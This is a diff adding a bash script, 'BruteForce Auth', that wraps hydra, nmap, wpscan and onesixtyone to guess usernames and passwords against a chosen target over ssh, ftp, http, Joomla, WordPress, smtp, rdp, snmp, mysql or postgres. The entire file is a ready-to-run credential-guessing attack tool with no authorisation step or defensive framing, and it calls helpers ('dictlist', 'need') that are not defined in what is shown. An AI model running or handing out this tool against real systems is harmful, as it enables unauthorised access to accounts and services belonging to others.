@@ -1,0 +1,49 @@
+#!/bin/bash
+# BruteForce Auth
+
+dictlist
+
+usage() {
+    echo "Usage: $0 -t [TARGET] -u [USER_LIST] -p [PASS_LIST] -s [SERVICE]"
+    echo "Supported Services: ssh, ftp, http, joomla, wordpress, smtp, rdp, snmp, mysql, postgres"
+    echo "Example: $0 -t example.com -u userlist.txt -p passwordlist.txt -s ssh"
+    exit 1
+}
+
+while getopts ":t:u:p:s:" opt; do
+    case $opt in
+        t) TARGET="$OPTARG" ;;
+        u) USER_LIST="$OPTARG" ;;
+        p) PASS_LIST="$OPTARG" ;;
+        s) SERVICE="$OPTARG" ;;
+        *) usage ;;
+    esac
+done
+
+
+[[ -z "$TARGET" || -z "$USER_LIST" || -z "$PASS_LIST" || -z "$SERVICE" ]] && usage
+
+brute_ssh() { need hydra; hydra -L "$USER_LIST" -P "$PASS_LIST" ssh://"$TARGET" -V; }
+brute_ftp() { need hydra; hydra -L "$USER_LIST" -P "$PASS_LIST" ftp://"$TARGET" -V; }
+brute_http() { need hydra; hydra -L "$USER_LIST" -P "$PASS_LIST" http-get "$TARGET" -V; }
+brute_joomla() { need nmap; nmap -p 80 --script http-joomla-brute --script-args userdb="$USER_LIST",passdb="$PASS_LIST",brute.mode=user,brute.firstonly=true "$TARGET"; }
+brute_wordpress() { need wpscan; wpscan --url "$TARGET" --usernames "$USER_LIST" --passwords "$PASS_LIST" --max-threads 50; }
+brute_smtp() { need hydra; hydra -L "$USER_LIST" -P "$PASS_LIST" smtp://"$TARGET" -V; }
+brute_rdp() { need hydra; hydra -L "$USER_LIST" -P "$PASS_LIST" rdp://"$TARGET" -V; }
+brute_snmp() { need onesixtyone; onesixtyone -c "$PASS_LIST" "$TARGET"; }
+brute_mysql() { need hydra; hydra -L "$USER_LIST" -P "$PASS_LIST" mysql://"$TARGET" -V; }
+brute_postgres() { need hydra; hydra -L "$USER_LIST" -P "$PASS_LIST" postgres://"$TARGET" -V; }
+
+case "$SERVICE" in
+    ssh) brute_ssh ;;
+    ftp) brute_ftp ;;
+    http) brute_http ;;
+    joomla) brute_joomla ;;
+    wordpress) brute_wordpress ;;
+    smtp) brute_smtp ;;
+    rdp) brute_rdp ;;
+    snmp) brute_snmp ;;
+    mysql) brute_mysql ;;
+    postgres) brute_postgres ;;
+    *) echo "Unsupported service: $SERVICE"; usage ;;
+esac
